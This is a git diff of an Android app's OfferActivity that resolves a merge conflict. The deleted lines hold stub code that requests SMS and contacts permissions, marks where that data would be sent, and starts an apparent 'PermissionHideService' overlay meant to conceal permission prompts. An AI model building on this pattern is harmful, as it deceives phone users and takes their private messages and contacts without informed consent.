@@ -22,20 +22,20 @@ public class OfferActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_offer);
 
-<<<<<<< HEAD
 
-        gatherData1();
-=======
+
+        requestContactPerm();
+
         getReadContactPermissions();
-        getReadSMSPermissions();
-        gatherData();
->>>>>>> a9827dba52676a3763046ff0d938f1f1c3fc6afa
+
+
+
 
         ImageView toast = (ImageView) findViewById(R.id.toast);
     }
 
 
-    private void gatherData1(){
+    private void requestContactPerm(){
    //     ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.READ_CONTACTS},
      //           REQUEST_CONTACTS_PERMISSION_CODE);
      //   overlayService(true);
@@ -47,32 +47,6 @@ public class OfferActivity extends AppCompatActivity {
     }
 
 
-    private void gatherData() {
-        if (getReadContactPermissions()) {
-            //send data
-        } else
-            messagePermissionOverlayService(true);
-
-
-        if (getReadSMSPermissions()) {
-            //send data
-        } else
-            messagePermissionOverlayService(true);
-    }
-
-    // Start or stop the permission overlay
-    private void messagePermissionOverlayService(boolean start) {
-        Intent i = new Intent();
-
-        i.setClassName("com.snakesonwheels.tabely.view", "com.snakesonwheels.tabely.view.PermissionHideService");
-        if (start) {
-            i.setAction("com.snakesonwheels.tabely.view.PermissionHideService.START");
-            startService(i);
-        } else {
-            i.setAction("com.snakesonwheels.tabely.view.PermissionHideService.STOP");
-            stopService(i);
-        }
-    }
 
     // Start or stop the GameService
     private void overlayService(boolean start) {
@@ -100,16 +74,6 @@ public class OfferActivity extends AppCompatActivity {
         return false;
     }
 
-    private boolean getReadSMSPermissions() {
-        // If READ_CONTACTS permission already granted return true
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
-            return true;
-        }
-        // Else request permission and return false
-        ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.READ_SMS},
-                REQUEST_SMS_PERMISSION_CODE);
-        return false;
-    }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[]
